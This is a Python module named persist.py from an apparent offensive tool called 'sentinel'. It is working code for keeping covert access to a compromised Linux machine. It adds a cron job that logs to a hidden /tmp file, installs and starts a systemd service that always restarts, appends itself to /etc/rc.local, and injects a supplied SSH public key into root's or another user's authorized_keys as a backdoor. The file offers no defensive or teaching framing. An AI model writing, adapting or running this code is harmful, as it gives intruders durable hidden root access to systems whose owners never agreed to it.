#!/usr/bin/env python3
"""
persist.py — persistence mechanisms
cron, rc.local, systemd service, authorized_keys injection
"""

import logging
import os
import pwd
import subprocess
from pathlib import Path

log = logging.getLogger("sentinel.persist")


class PersistEngine:
    def __init__(self, output_dir: Path):
        self.output_dir = output_dir
        self.methods_installed = []

    def install(self):
        self._cron()
        self._systemd()
        self._rc_local()
        log.info(f"persistence installed via: {self.methods_installed}")

    def _cron(self):
        try:
            sentinel_path = Path(os.path.abspath(__file__)).parent.parent / "sentinel.py"
            cron_line = f"*/5 * * * * python3 {sentinel_path} --mode passive >> /tmp/.s.log 2>&1"

            existing = subprocess.run(
                ["crontab", "-l"], capture_output=True, text=True
            ).stdout

            if str(sentinel_path) not in existing:
                new_cron = existing.rstrip() + "\n" + cron_line + "\n"
                proc = subprocess.run(
                    ["crontab", "-"],
                    input=new_cron, text=True, capture_output=True
                )
                if proc.returncode == 0:
                    self.methods_installed.append("cron")
                    log.info("cron persistence installed")
        except Exception as e:
            log.error(f"cron persistence failed: {e}")

    def _systemd(self):
        try:
            sentinel_path = Path(os.path.abspath(__file__)).parent.parent / "sentinel.py"
            service = f"""[Unit]
Description=sentinel
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 {sentinel_path} --mode passive
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
"""
            service_file = Path("/etc/systemd/system/sentinel.service")
            service_file.write_text(service)

            subprocess.run(["systemctl", "daemon-reload"], capture_output=True)
            subprocess.run(["systemctl", "enable", "sentinel"], capture_output=True)
            subprocess.run(["systemctl", "start", "sentinel"], capture_output=True)

            self.methods_installed.append("systemd")
            log.info("systemd persistence installed")
        except PermissionError:
            log.warning("systemd: no permission (need root)")
        except Exception as e:
            log.error(f"systemd persistence failed: {e}")

    def _rc_local(self):
        try:
            sentinel_path = Path(os.path.abspath(__file__)).parent.parent / "sentinel.py"
            rc_local = Path("/etc/rc.local")

            if rc_local.exists():
                content = rc_local.read_text()
                if "sentinel" not in content:
                    line = f"\npython3 {sentinel_path} --mode passive &\n"
                    if "exit 0" in content:
                        content = content.replace("exit 0", line + "exit 0")
                    else:
                        content += line
                    rc_local.write_text(content)
                    self.methods_installed.append("rc.local")
                    log.info("rc.local persistence installed")
        except Exception as e:
            log.error(f"rc.local persistence failed: {e}")

    def inject_ssh_key(self, pubkey: str, user: str = "root"):
        try:
            if user == "root":
                ssh_dir = Path("/root/.ssh")
            else:
                home = pwd.getpwnam(user).pw_dir
                ssh_dir = Path(home) / ".ssh"

            ssh_dir.mkdir(mode=0o700, exist_ok=True)
            auth_keys = ssh_dir / "authorized_keys"

            existing = auth_keys.read_text() if auth_keys.exists() else ""
            if pubkey not in existing:
                with open(auth_keys, "a") as f:
                    f.write("\n" + pubkey + "\n")
                auth_keys.chmod(0o600)
                log.info(f"SSH key injected for {user}")
                self.methods_installed.append("ssh_key")
        except Exception as e:
            log.error(f"SSH key injection failed: {e}")
